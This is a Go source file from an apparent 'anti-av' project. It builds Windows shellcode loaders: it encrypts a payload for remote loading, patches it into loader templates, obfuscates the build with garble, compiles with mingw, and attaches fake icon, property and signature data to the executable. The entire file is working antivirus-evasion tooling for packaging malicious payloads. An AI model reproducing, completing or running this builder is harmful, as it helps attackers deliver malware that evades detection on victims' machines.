package main

import (
	"fmt"
	"io/ioutil"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"github.com/b1gcat/anti-av/utils"
	"github.com/sirupsen/logrus"
)

var (
	topdir, _    = filepath.Abs(filepath.Join("."))
	buildDir     = filepath.Join(topdir, "dist", "_tmp")
	ePayloadFile = filepath.Join(topdir, "dist", "payload.e")
	copyCmd      = "cp -r"
)

func init() {
	if runtime.GOOS == "windows" {
		copyCmd = "copy /r"
	}
	rand.Seed(time.Now().UnixNano())
}

func (c *config) build() {
	code, err := c.generateCode()
	if err != nil {
		logrus.Error("[-] ", err.Error())
		return
	}
	//保存加密payload
	if c.encrypt {
		if err := ioutil.WriteFile(ePayloadFile, code, 0755); err != nil {
			logrus.Error("[-] ", err.Error())
			return
		}
		logrus.Info("[+] 生成用于远程加载的payload:", ePayloadFile)
		return
	}

	logrus.Info("[+] 生成代码...")
	if err := c.building(code); err != nil {
		logrus.Error("[-] ", err.Error())
		return
	}
}

func (c *config) building(code []byte) error {
	if err := c.setup(); err != nil {
		return err
	}
	//切换到临时目录编译
	logrus.Info("[+] 进入临时目录 ", buildDir)
	os.Chdir(buildDir)
	//完成后清空
	defer func() {
		logrus.Info("[+] 清空临时目录 ", buildDir)
		defer os.RemoveAll(filepath.Join("..", "_tmp"))
	}()

	if err := c.prepare(code); err != nil {
		return err
	}

	if err := c.compile(); err != nil {
		return err
	}

	return nil
}

func (c *config) setup() error {
	os.RemoveAll(filepath.Join("dist", "_tmp"))
	logrus.Info("[+] 创建目录 ", buildDir)
	os.MkdirAll(buildDir, 0755)
	loader := filepath.Join(buildDir, c.loader)
	os.MkdirAll(loader, 0755)

	if err := utils.Cmd(fmt.Sprintf("%s %s %s", copyCmd, filepath.Join("loader", "*"), buildDir)); err != nil {
		return err
	}
	utils.Cmd("go env -w GOPROXY=https://goproxy.cn,direct")
	utils.Cmd("go install mvdan.cc/garble@latest")
	return nil
}

func (c *config) prepare(code []byte) error {
	ref := patch{
		CODE:            c.formatPayload(code),
		HOST_OBFUSCATOR: c.hostObfuscator,
		LOADER:          c.loader,
		MODE:            strings.ToUpper(c.mode),
		ASM:             "NOASM",
	}
	if c.nosign {
		c.valid = ""
	}
	if c.asm {
		ref.ASM = "__ASM__"
	}
	if err := c.patch(&ref, "."); err != nil {
		return err
	}

	return nil
}

func (c *config) compile() error {
	if _, err := exec.LookPath("x86_64-w64-mingw32-gcc"); err != nil {
		logrus.Errorf("[-] 缺少Mingw64")
		os.Exit(0)
	}
	if !c.nosign {
		utils.CreateIcoPropertity(c.arch, topdir)
		defer os.Remove("resource_windows.syso")
	}
	output := filepath.Join(topdir, "dist", c.output)
	if err := utils.Cmd(
		fmt.Sprintf("OUTFILE=%s ASM=%v OS=%s LOADER=%s MODE=%s ARCH=%s make",
			output, c.asm, c.os,
			c.loader, strings.ToUpper(c.mode), c.arch)); err != nil {
		return err
	}
	utils.SignExecutable(c.valid, output)
	logrus.Infof("[+] 生成文件(%s):%s", c.arch, output)
	return nil
}
